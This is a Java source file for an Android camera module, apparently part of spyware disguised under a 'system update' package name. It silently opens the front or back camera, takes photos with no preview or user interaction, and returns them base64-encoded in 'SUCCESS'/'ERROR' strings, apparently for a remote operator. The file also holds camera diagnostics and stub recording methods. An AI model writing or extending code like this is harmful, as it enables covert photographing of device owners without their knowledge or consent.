package com.android.system.update.modules;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.ImageFormat;
import android.hardware.camera2.*;
import android.hardware.camera2.params.StreamConfigurationMap;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;
import android.util.Base64;
import android.util.Log;
import android.util.Size;
import android.view.Surface;

import androidx.core.app.ActivityCompat;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReference;

public class CameraModule {
    private static final String TAG = "CameraModule";
    private static final int CAPTURE_TIMEOUT_SECONDS = 5;
    private static final int MAX_RETRY_ATTEMPTS = 3;
    private static final int TEST_IMAGE_WIDTH = 640;
    private static final int TEST_IMAGE_HEIGHT = 480;
    
    private Context context;
    private CameraManager cameraManager;
    private String currentCameraId;
    private String backCameraId;
    private String frontCameraId;
    private Handler backgroundHandler;
    private HandlerThread backgroundThread;
    private Handler mainHandler;
    private boolean isUsingFrontCamera = false;
    private ImageReader imageReader;
    private CameraDevice cameraDevice;
    private CameraCaptureSession captureSession;
    
    public CameraModule(Context context) {
        Log.d(TAG, "📸 CameraModule constructor called");
        this.context = context;
        this.cameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
        this.mainHandler = new Handler(Looper.getMainLooper());
        startBackgroundThread();
        
        Log.d(TAG, "📸 CameraManager obtained: " + (cameraManager != null));
        
        // Find both front and back cameras
        findCameras();
    }
    
    private void startBackgroundThread() {
        backgroundThread = new HandlerThread("CameraBackground");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
        Log.d(TAG, "📸 Background thread started");
    }
    
    private void stopBackgroundThread() {
        if (backgroundThread != null) {
            backgroundThread.quitSafely();
            try {
                backgroundThread.join();
                backgroundThread = null;
                backgroundHandler = null;
                Log.d(TAG, "📸 Background thread stopped");
            } catch (InterruptedException e) {
                Log.e(TAG, "Error stopping background thread", e);
            }
        }
    }
    
    private void findCameras() {
        try {
            String[] cameraIdList = cameraManager.getCameraIdList();
            Log.d(TAG, "📸 Available cameras: " + Arrays.toString(cameraIdList));
            
            for (String id : cameraIdList) {
                CameraCharacteristics chars = cameraManager.getCameraCharacteristics(id);
                Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
                Log.d(TAG, "📸 Camera " + id + " facing: " + facing);
                
                if (facing != null) {
                    if (facing == CameraCharacteristics.LENS_FACING_BACK) {
                        backCameraId = id;
                        Log.d(TAG, "📸 Found back camera: " + id);
                    } else if (facing == CameraCharacteristics.LENS_FACING_FRONT) {
                        frontCameraId = id;
                        Log.d(TAG, "📸 Found front camera: " + id);
                    }
                }
            }
            
            // Set default camera (prefer back, then front, then first available)
            if (backCameraId != null) {
                currentCameraId = backCameraId;
                isUsingFrontCamera = false;
                Log.d(TAG, "📸 Using back camera: " + currentCameraId);
            } else if (frontCameraId != null) {
                currentCameraId = frontCameraId;
                isUsingFrontCamera = true;
                Log.d(TAG, "📸 Using front camera: " + currentCameraId);
            } else if (cameraIdList.length > 0) {
                currentCameraId = cameraIdList[0];
                Log.d(TAG, "📸 Using first available camera: " + currentCameraId);
            } else {
                Log.e(TAG, "❌ No cameras found");
            }
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Error finding cameras", e);
        }
    }
    
    public String switchCamera() {
        Log.d(TAG, "🔄 switchCamera() called");
        
        if (frontCameraId == null && backCameraId == null) {
            Log.e(TAG, "❌ No front or back camera available");
            return "ERROR: No front or back camera available";
        }
        
        closeCamera();
        
        // Toggle between front and back
        if (isUsingFrontCamera) {
            if (backCameraId != null) {
                currentCameraId = backCameraId;
                isUsingFrontCamera = false;
                Log.d(TAG, "🔄 Switched to back camera: " + currentCameraId);
                return "SUCCESS: Switched to back camera";
            } else {
                Log.e(TAG, "❌ No back camera available");
                return "ERROR: No back camera available";
            }
        } else {
            if (frontCameraId != null) {
                currentCameraId = frontCameraId;
                isUsingFrontCamera = true;
                Log.d(TAG, "🔄 Switched to front camera: " + currentCameraId);
                return "SUCCESS: Switched to front camera";
            } else {
                Log.e(TAG, "❌ No front camera available");
                return "ERROR: No front camera available";
            }
        }
    }
    
    public String getCurrentCamera() {
        return isUsingFrontCamera ? "front" : "back";
    }
    
    private void closeCamera() {
        if (captureSession != null) {
            captureSession.close();
            captureSession = null;
            Log.d(TAG, "📸 Capture session closed");
        }
        if (cameraDevice != null) {
            cameraDevice.close();
            cameraDevice = null;
            Log.d(TAG, "📸 Camera device closed");
        }
        if (imageReader != null) {
            imageReader.close();
            imageReader = null;
            Log.d(TAG, "📸 ImageReader closed");
        }
    }
    
    private boolean checkPermission() {
        return ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA)
            == PackageManager.PERMISSION_GRANTED;
    }
    
    private Size getLargestSize() {
        try {
            CameraCharacteristics chars = cameraManager.getCameraCharacteristics(currentCameraId);
            StreamConfigurationMap configs = chars.get(
                CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
            if (configs == null) {
                Log.w(TAG, "⚠️ No stream configuration map, using default size");
                return new Size(1920, 1080);
            }
            
            Size[] sizes = configs.getOutputSizes(ImageFormat.JPEG);
            if (sizes == null || sizes.length == 0) {
                Log.w(TAG, "⚠️ No JPEG sizes available, using default");
                return new Size(1920, 1080);
            }
            
            Size largest = sizes[0];
            for (Size size : sizes) {
                if (size.getWidth() * size.getHeight() > largest.getWidth() * largest.getHeight()) {
                    largest = size;
                }
            }
            Log.d(TAG, "📐 Largest size: " + largest.getWidth() + "x" + largest.getHeight());
            return largest;
        } catch (Exception e) {
            Log.e(TAG, "Error getting largest size", e);
            return new Size(1920, 1080);
        }
    }
    
    private Size getSmallestSize() {
        try {
            CameraCharacteristics chars = cameraManager.getCameraCharacteristics(currentCameraId);
            StreamConfigurationMap configs = chars.get(
                CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
            if (configs == null) {
                return new Size(TEST_IMAGE_WIDTH, TEST_IMAGE_HEIGHT);
            }
            
            Size[] sizes = configs.getOutputSizes(ImageFormat.JPEG);
            if (sizes == null || sizes.length == 0) {
                return new Size(TEST_IMAGE_WIDTH, TEST_IMAGE_HEIGHT);
            }
            
            Size smallest = sizes[0];
            for (Size size : sizes) {
                if (size.getWidth() * size.getHeight() < smallest.getWidth() * smallest.getHeight()) {
                    smallest = size;
                }
            }
            return smallest;
        } catch (Exception e) {
            Log.e(TAG, "Error getting smallest size", e);
            return new Size(TEST_IMAGE_WIDTH, TEST_IMAGE_HEIGHT);
        }
    }
    
    private byte[] readFileToBytes(File file) throws IOException {
        try (FileInputStream fis = new FileInputStream(file)) {
            byte[] bytes = new byte[(int) file.length()];
            fis.read(bytes);
            return bytes;
        }
    }
    
    public String captureTestImage() {
        Log.d(TAG, "📸 captureTestImage() - capturing small test image");
        
        if (!checkPermission()) {
            Log.e(TAG, "❌ No camera permission");
            return "ERROR: No camera permission";
        }
        
        if (currentCameraId == null) {
            Log.e(TAG, "❌ No camera available");
            return "ERROR: No camera available";
        }
        
        closeCamera();
        
        final AtomicReference<String> result = new AtomicReference<>("ERROR");
        final CountDownLatch latch = new CountDownLatch(1);
        
        try {
            // Use smallest possible size for test
            Size testSize = getSmallestSize();
            Log.d(TAG, "📐 Using test size: " + testSize.getWidth() + "x" + testSize.getHeight());
            
            imageReader = ImageReader.newInstance(testSize.getWidth(), testSize.getHeight(), 
                ImageFormat.JPEG, 2);
            
            imageReader.setOnImageAvailableListener(reader -> {
                Log.d(TAG, "📸 Test image available");
                try (Image image = reader.acquireLatestImage()) {
                    if (image == null) {
                        Log.e(TAG, "❌ Test image is null");
                        result.set("ERROR: Image null");
                        latch.countDown();
                        return;
                    }
                    
                    ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                    byte[] bytes = new byte[buffer.remaining()];
                    buffer.get(bytes);
                    
                    Log.d(TAG, "📸 Test image bytes: " + bytes.length);
                    
                    // Convert to base64 for response
                    String base64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
                    result.set("SUCCESS:" + bytes.length + ":" + base64);
                    
                } catch (Exception e) {
                    Log.e(TAG, "Error in test image listener", e);
                    result.set("ERROR: " + e.getMessage());
                } finally {
                    latch.countDown();
                }
            }, backgroundHandler);
            
            cameraManager.openCamera(currentCameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(CameraDevice device) {
                    cameraDevice = device;
                    Log.d(TAG, "✅ Test camera opened");
                    
                    try {
                        List<Surface> surfaces = new ArrayList<>();
                        surfaces.add(imageReader.getSurface());
                        
                        device.createCaptureSession(surfaces,
                            new CameraCaptureSession.StateCallback() {
                                @Override
                                public void onConfigured(CameraCaptureSession session) {
                                    captureSession = session;
                                    Log.d(TAG, "✅ Test session configured");
                                    
                                    try {
                                        CaptureRequest.Builder builder = 
                                            device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                                        builder.addTarget(imageReader.getSurface());
                                        builder.set(CaptureRequest.JPEG_QUALITY, (byte) 80);
                                        
                                        // Add auto-focus
                                        builder.set(CaptureRequest.CONTROL_AF_MODE, 
                                            CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
                                        
                                        session.capture(builder.build(), 
                                            new CameraCaptureSession.CaptureCallback() {
                                                @Override
                                                public void onCaptureCompleted(CameraCaptureSession session, 
                                                        CaptureRequest request, TotalCaptureResult captureResult) {
                                                    Log.d(TAG, "✅ Test capture completed");
                                                }
                                            }, backgroundHandler);
                                            
                                    } catch (Exception e) {
                                        Log.e(TAG, "Error in test capture request", e);
                                        result.set("ERROR: " + e.getMessage());
                                        latch.countDown();
                                        closeCamera();
                                    }
                                }
                                
                                @Override
                                public void onConfigureFailed(CameraCaptureSession session) {
                                    Log.e(TAG, "❌ Test session configure failed");
                                    result.set("ERROR: Session configure failed");
                                    latch.countDown();
                                    closeCamera();
                                }
                            }, backgroundHandler
                        );
                    } catch (Exception e) {
                        Log.e(TAG, "Error creating test session", e);
                        result.set("ERROR: " + e.getMessage());
                        latch.countDown();
                        closeCamera();
                    }
                }
                
                @Override
                public void onDisconnected(CameraDevice device) {
                    Log.w(TAG, "⚠️ Test camera disconnected");
                    result.set("ERROR: Camera disconnected");
                    latch.countDown();
                    closeCamera();
                }
                
                @Override
                public void onError(CameraDevice device, int error) {
                    Log.e(TAG, "❌ Test camera error: " + error);
                    result.set("ERROR: Camera error: " + error);
                    latch.countDown();
                    closeCamera();
                }
            }, backgroundHandler);
            
            if (latch.await(5000, TimeUnit.MILLISECONDS)) {
                closeCamera();
                return result.get();
            } else {
                closeCamera();
                return "ERROR: Test capture timeout";
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error in test capture", e);
            closeCamera();
            return "ERROR: " + e.getMessage();
        }
    }
    
    public String takePhoto() {
        Log.d(TAG, "📸 takePhoto() called with camera: " + currentCameraId);
        
        if (!checkPermission()) {
            Log.e(TAG, "❌ No camera permission");
            return "ERROR: No camera permission";
        }
        
        if (currentCameraId == null) {
            Log.e(TAG, "❌ No camera ID available");
            return "ERROR: No camera available";
        }
        
        // Close any existing camera resources
        closeCamera();
        
        final AtomicReference<String> result = new AtomicReference<>("ERROR: Failed to capture");
        final CountDownLatch latch = new CountDownLatch(1);
        
        for (int attempt = 0; attempt < MAX_RETRY_ATTEMPTS; attempt++) {
            try {
                Log.d(TAG, "📸 Capture attempt " + (attempt + 1) + "/" + MAX_RETRY_ATTEMPTS);
                
                final File photoFile = File.createTempFile("photo", ".jpg", 
                    context.getExternalFilesDir(null));
                Log.d(TAG, "📁 Temp file created: " + photoFile.getAbsolutePath());
                
                // Get the largest size
                Size largest = getLargestSize();
                
                // Create ImageReader
                imageReader = ImageReader.newInstance(largest.getWidth(), 
                    largest.getHeight(), ImageFormat.JPEG, 2);
                
                // Set up the ImageAvailableListener
                imageReader.setOnImageAvailableListener(reader -> {
                    Log.d(TAG, "📸 Image available");
                    try (Image image = reader.acquireLatestImage()) {
                        if (image == null) {
                            Log.e(TAG, "❌ Image is null");
                            result.set("ERROR: Image is null");
                            latch.countDown();
                            return;
                        }
                        
                        ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                        byte[] bytes = new byte[buffer.remaining()];
                        buffer.get(bytes);
                        
                        Log.d(TAG, "📸 Image bytes: " + bytes.length);
                        
                        try (FileOutputStream fos = new FileOutputStream(photoFile)) {
                            fos.write(bytes);
                        }
                        
                        Log.d(TAG, "✅ Photo saved to: " + photoFile.getAbsolutePath());
                        
                        // Read file and convert to base64
                        byte[] fileBytes = readFileToBytes(photoFile);
                        String base64 = Base64.encodeToString(fileBytes, Base64.NO_WRAP);
                        photoFile.delete();
                        
                        result.set(base64);
                        
                    } catch (Exception e) {
                        Log.e(TAG, "❌ Error in ImageAvailableListener", e);
                        result.set("ERROR: " + e.getMessage());
                    } finally {
                        latch.countDown();
                    }
                }, backgroundHandler);
                
                // Open camera
                cameraManager.openCamera(currentCameraId, new CameraDevice.StateCallback() {
                    @Override
                    public void onOpened(CameraDevice device) {
                        Log.d(TAG, "✅ Camera opened");
                        cameraDevice = device;
                        
                        try {
                            // Create capture session
                            List<Surface> surfaces = new ArrayList<>();
                            surfaces.add(imageReader.getSurface());
                            
                            device.createCaptureSession(surfaces,
                                new CameraCaptureSession.StateCallback() {
                                    @Override
                                    public void onConfigured(CameraCaptureSession session) {
                                        Log.d(TAG, "✅ Session configured");
                                        captureSession = session;
                                        
                                        try {
                                            CaptureRequest.Builder builder = 
                                                device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                                            builder.addTarget(imageReader.getSurface());
                                            builder.set(CaptureRequest.JPEG_QUALITY, (byte) 95);
                                            
                                            // Add auto-focus and auto-exposure
                                            builder.set(CaptureRequest.CONTROL_AF_MODE, 
                                                CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
                                            builder.set(CaptureRequest.CONTROL_AE_MODE, 
                                                CaptureRequest.CONTROL_AE_MODE_ON_AUTO_FLASH);
                                            
                                            session.capture(builder.build(), 
                                                new CameraCaptureSession.CaptureCallback() {
                                                    @Override
                                                    public void onCaptureCompleted(CameraCaptureSession session, 
                                                            CaptureRequest request, TotalCaptureResult result) {
                                                        Log.d(TAG, "✅ Capture completed");
                                                    }
                                                }, backgroundHandler);
                                                
                                        } catch (Exception e) {
                                            Log.e(TAG, "❌ Error creating capture request", e);
                                            result.set("ERROR: " + e.getMessage());
                                            latch.countDown();
                                            closeCamera();
                                        }
                                    }
                                    
                                    @Override
                                    public void onConfigureFailed(CameraCaptureSession session) {
                                        Log.e(TAG, "❌ Session configure failed");
                                        result.set("ERROR: Session configure failed");
                                        latch.countDown();
                                        closeCamera();
                                    }
                                }, backgroundHandler
                            );
                        } catch (Exception e) {
                            Log.e(TAG, "❌ Error creating session", e);
                            result.set("ERROR: " + e.getMessage());
                            latch.countDown();
                            closeCamera();
                        }
                    }
                    
                    @Override
                    public void onDisconnected(CameraDevice device) {
                        Log.w(TAG, "⚠️ Camera disconnected");
                        device.close();
                        cameraDevice = null;
                        result.set("ERROR: Camera disconnected");
                        latch.countDown();
                    }
                    
                    @Override
                    public void onError(CameraDevice device, int error) {
                        Log.e(TAG, "❌ Camera error: " + error);
                        device.close();
                        cameraDevice = null;
                        result.set("ERROR: Camera error: " + error);
                        latch.countDown();
                    }
                }, backgroundHandler);
                
                // Wait for photo to be taken
                if (latch.await(CAPTURE_TIMEOUT_SECONDS, TimeUnit.SECONDS)) {
                    String finalResult = result.get();
                    if (finalResult != null && !finalResult.startsWith("ERROR")) {
                        Log.d(TAG, "✅ Photo captured successfully");
                        closeCamera();
                        return finalResult;
                    } else if (attempt < MAX_RETRY_ATTEMPTS - 1) {
                        Log.w(TAG, "⚠️ Capture failed, retrying...");
                        closeCamera();
                        Thread.sleep(500); // Wait before retry
                        continue;
                    } else {
                        closeCamera();
                        return finalResult != null ? finalResult : "ERROR: Unknown error";
                    }
                } else {
                    if (attempt < MAX_RETRY_ATTEMPTS - 1) {
                        Log.w(TAG, "⚠️ Capture timeout, retrying...");
                        closeCamera();
                        continue;
                    } else {
                        closeCamera();
                        return "ERROR: Capture timeout after " + CAPTURE_TIMEOUT_SECONDS + " seconds";
                    }
                }
                
            } catch (Exception e) {
                Log.e(TAG, "❌ Error in takePhoto attempt " + (attempt + 1), e);
                closeCamera();
                if (attempt < MAX_RETRY_ATTEMPTS - 1) {
                    try {
                        Thread.sleep(500);
                    } catch (InterruptedException ie) {
                        // Ignore
                    }
                } else {
                    return "ERROR: " + e.getMessage();
                }
            }
        }
        
        return "ERROR: All capture attempts failed";
    }
    
    public String testCapture() {
        Log.d(TAG, "📸 testCapture() called");
        if (!checkPermission()) {
            return "ERROR: No camera permission";
        }
        
        try {
            // Try to open camera briefly
            CountDownLatch latch = new CountDownLatch(1);
            AtomicReference<String> result = new AtomicReference<>("Failed");
            
            cameraManager.openCamera(currentCameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(CameraDevice device) {
                    Log.d(TAG, "✅ Test camera opened successfully");
                    device.close();
                    result.set("SUCCESS");
                    latch.countDown();
                }
                
                @Override
                public void onDisconnected(CameraDevice device) {
                    Log.e(TAG, "❌ Test camera disconnected");
                    result.set("ERROR: Disconnected");
                    latch.countDown();
                }
                
                @Override
                public void onError(CameraDevice device, int error) {
                    Log.e(TAG, "❌ Test camera error: " + error);
                    result.set("ERROR: " + error);
                    latch.countDown();
                }
            }, backgroundHandler);
            
            if (latch.await(5000, TimeUnit.MILLISECONDS)) {
                return result.get();
            } else {
                return "ERROR: Timeout opening camera";
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ testCapture failed", e);
            return "ERROR: " + e.getMessage();
        }
    }
    
    public String testCamera() {
        Log.d(TAG, "🔧 Testing camera module");
        if (!checkPermission()) {
            return "ERROR: No camera permission";
        }
        
        try {
            String[] cameraIds = cameraManager.getCameraIdList();
            Log.d(TAG, "Available cameras: " + Arrays.toString(cameraIds));
            
            if (currentCameraId == null) {
                return "ERROR: No camera selected";
            }
            
            CameraCharacteristics chars = cameraManager.getCameraCharacteristics(currentCameraId);
            Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
            String facingStr = facing == CameraCharacteristics.LENS_FACING_BACK ? "BACK" : 
                              (facing == CameraCharacteristics.LENS_FACING_FRONT ? "FRONT" : "OTHER");
            
            return "SUCCESS: Camera " + currentCameraId + " (" + facingStr + ") is available";
        } catch (Exception e) {
            Log.e(TAG, "❌ Camera test failed", e);
            return "ERROR: " + e.getMessage();
        }
    }
    
    public String testCamera2() {
        Log.d(TAG, "🔍 Running comprehensive camera test");
        
        if (!checkPermission()) {
            return "ERROR: No camera permission";
        }
        
        try {
            StringBuilder report = new StringBuilder();
            report.append("Camera test results:\n");
            
            String[] cameraIds = cameraManager.getCameraIdList();
            report.append("Total cameras: ").append(cameraIds.length).append("\n");
            
            for (String id : cameraIds) {
                CameraCharacteristics chars = cameraManager.getCameraCharacteristics(id);
                Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
                String facingStr = facing == CameraCharacteristics.LENS_FACING_BACK ? "BACK" : 
                                  (facing == CameraCharacteristics.LENS_FACING_FRONT ? "FRONT" : "OTHER");
                
                report.append("Camera ").append(id).append(" (").append(facingStr).append(")\n");
                
                // Check hardware level
                Integer level = chars.get(CameraCharacteristics.INFO_SUPPORTED_HARDWARE_LEVEL);
                String levelStr;
                if (level != null) {
                    switch (level) {
                        case CameraCharacteristics.INFO_SUPPORTED_HARDWARE_LEVEL_FULL:
                            levelStr = "FULL";
                            break;
                        case CameraCharacteristics.INFO_SUPPORTED_HARDWARE_LEVEL_LIMITED:
                            levelStr = "LIMITED";
                            break;
                        case CameraCharacteristics.INFO_SUPPORTED_HARDWARE_LEVEL_LEGACY:
                            levelStr = "LEGACY";
                            break;
                        case CameraCharacteristics.INFO_SUPPORTED_HARDWARE_LEVEL_3:
                            levelStr = "LEVEL_3";
                            break;
                        default:
                            levelStr = "UNKNOWN";
                    }
                    report.append("  Hardware level: ").append(levelStr).append("\n");
                }
                
                // Get available sizes
                StreamConfigurationMap configs = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
                if (configs != null) {
                    Size[] sizes = configs.getOutputSizes(ImageFormat.JPEG);
                    if (sizes != null && sizes.length > 0) {
                        report.append("  Available JPEG sizes: ").append(sizes.length).append("\n");
                        report.append("  Max size: ").append(sizes[0].getWidth()).append("x").append(sizes[0].getHeight()).append("\n");
                    }
                }
            }
            
            report.append("Current camera: ").append(currentCameraId).append("\n");
            report.append("Is front: ").append(isUsingFrontCamera);
            
            Log.d(TAG, report.toString());
            return "SUCCESS: " + report.toString();
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Camera test failed", e);
            return "ERROR: " + e.getMessage();
        }
    }
    
    public String checkCameraStatus() {
        Log.d(TAG, "🔍 Checking camera status");
        try {
            String[] cameraIds = cameraManager.getCameraIdList();
            StringBuilder status = new StringBuilder();
            status.append("Cameras: ").append(Arrays.toString(cameraIds)).append("\n");
            
            for (String id : cameraIds) {
                CameraCharacteristics chars = cameraManager.getCameraCharacteristics(id);
                Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
                String facingStr = facing == CameraCharacteristics.LENS_FACING_BACK ? "BACK" : 
                                  (facing == CameraCharacteristics.LENS_FACING_FRONT ? "FRONT" : "OTHER");
                
                status.append("Camera ").append(id).append(" (").append(facingStr).append(")");
                
                if (id.equals(currentCameraId)) {
                    status.append(" [CURRENT]");
                }
                status.append("\n");
            }
            
            return "SUCCESS: " + status.toString();
        } catch (Exception e) {
            Log.e(TAG, "❌ Camera status check failed", e);
            return "ERROR: " + e.getMessage();
        }
    }
    
    public String simpleTest() {
        Log.d(TAG, "🔧 Simple camera test");
        if (!checkPermission()) {
            return "ERROR: No camera permission";
        }
        
        try {
            if (currentCameraId == null) {
                return "ERROR: No camera selected";
            }
            
            CameraCharacteristics chars = cameraManager.getCameraCharacteristics(currentCameraId);
            Integer level = chars.get(CameraCharacteristics.INFO_SUPPORTED_HARDWARE_LEVEL);
            String levelStr;
            if (level != null) {
                switch (level) {
                    case CameraCharacteristics.INFO_SUPPORTED_HARDWARE_LEVEL_FULL:
                        levelStr = "FULL";
                        break;
                    case CameraCharacteristics.INFO_SUPPORTED_HARDWARE_LEVEL_LIMITED:
                        levelStr = "LIMITED";
                        break;
                    case CameraCharacteristics.INFO_SUPPORTED_HARDWARE_LEVEL_LEGACY:
                        levelStr = "LEGACY";
                        break;
                    case CameraCharacteristics.INFO_SUPPORTED_HARDWARE_LEVEL_3:
                        levelStr = "LEVEL_3";
                        break;
                    default:
                        levelStr = "UNKNOWN";
                }
                return "SUCCESS: Camera hardware level: " + levelStr;
            } else {
                return "SUCCESS: Camera is accessible";
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Simple test failed", e);
            return "ERROR: " + e.getMessage();
        }
    }
    
    public String simpleCapture() {
        Log.d(TAG, "📸 simpleCapture() called");
        if (!checkPermission()) {
            return "ERROR: No camera permission";
        }
        
        try {
            CameraCharacteristics chars = cameraManager.getCameraCharacteristics(currentCameraId);
            Log.d(TAG, "📸 Camera characteristics: " + chars.get(CameraCharacteristics.INFO_SUPPORTED_HARDWARE_LEVEL));
            return "SUCCESS: Camera accessible";
        } catch (Exception e) {
            Log.e(TAG, "❌ simpleCapture failed", e);
            return "ERROR: " + e.getMessage();
        }
    }
    
    public void startRecording(String args) {
        if (!checkPermission()) return;
        // Recording implementation would go here
        Log.d(TAG, "Recording started (stub)");
    }
    
    public String stopRecording() {
        Log.d(TAG, "Recording stopped (stub)");
        return "Recording stopped";
    }
    
    // Cleanup method to be called when module is destroyed
    public void cleanup() {
        Log.d(TAG, "🧹 Cleaning up camera module");
        closeCamera();
        stopBackgroundThread();
    }
}
